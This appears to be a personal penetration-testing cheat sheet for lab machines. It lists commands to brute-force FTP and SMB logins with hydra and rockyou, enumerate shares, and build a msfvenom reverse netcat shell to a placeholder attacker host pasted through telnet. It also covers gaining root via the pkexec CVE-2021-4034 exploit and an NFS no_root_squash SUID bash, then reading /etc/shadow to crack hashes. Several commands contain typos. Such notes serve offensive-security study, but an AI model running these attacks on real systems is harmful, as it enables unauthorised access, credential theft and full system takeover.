FTP SMB TELNET EXPLOITATION AND ESCALATE PRIV

FTP EXPLOITATION (port 21)
sudo nmap -sS -A -T4 -p- 10.10.110.1
locate rockyou
hydra -l username -P /user/share/wordlists/rockyou.txt 10.10.110.1 ftp -v

for fast nmap scan for all the ports 
nmap -T5 -A -p- -v --min-rate=500 10.10.120.212


SMB EXPLOITATION
sudo nmap -T4 -Ss -p 139,445 --script vuln 10.10.178.0/24
first enumerate smb 
enum4linux -a 10.10.178.1
nmap --script smb-os-discovery.nse 10.10.178.1

to access smb share 
smbclient //10.10.178.1/share
smbclient -L (to list all shares) 
get (to get the file ) 

or use hydra to obtain user and pwd
hydra -l username -P /dir/passwords.txt 101.10.78.1 smb 



TELNET EXPLOITATION
sudo nmap -sS -sV -p- -O 10.10.5.111
telnet 10.10.5.166 23
msfvenom -p cmd/unix/reverse_netcat LHOST=attacker LPORT=4444

open a netcat session with : nc -lnvp 4444
copy the payload and paste in the telnet
check with .HELP if need .RUN first


Escalate privileges in PKEXEC (pkexec CVE-2021-4034 vulnerability)

first search for linpeas github
linpeas.sh
copy the command with the curl 
run in the shell to find vulnerability for escalate privileges
we can look for an exploitation cve 2021-4034 pawn
search in google for berdav/CVE-2021-4034
click on code , copy the link
shell 
cd /tmp 
git clone (paste the link)
cd CVE-2021-4034
make
whoami user
./cve-2021-4034 execute the compiled file
whoami root
sudo -l (check sudo privileges)



Escalate privileges in linux exploiting misconfigured NFS shares
1st step
sudo apt-get update
sudo apt install nfs-kernel-server
nano /etc/exports

2nd step 
edit the exports file and append 
/home      *(rw,no_root_squash)

3rd step restart the server
sudo /etc/init.d/nfs-kernel-server restart

nmap -sV --script=nfs-showmount 192.168.1.102
we can find port 2049 open
the same thing can be done manually
apt-get install nfs-common
showmount -e 192.168.1.102

now we can exploit the server NFS to obtain root privileges
mkdir /tmp/nfs
mount -t nfs 192.168.1.102:/home /tmp/nfs
cp /bin/bash .
chmod +s bash 
ls -la bash

LAST STEP PRIVILEGE ESCALATION
cd /home
ls 
./bash -p
id
whoami

further exploitation:
cp /bin/nano.
chmod 4777 nano 
ls -la nano
./nano -p /etc/shadow (we can find hash files and try to crack the hashes)


nmap -sn ipaddr.1/24 -oN nmap.txt
nmap -O ipaddr.1/24 -oN nmap-OS.txt
namp -sC -sV -sS ipaddr -oN nmap-all.txt

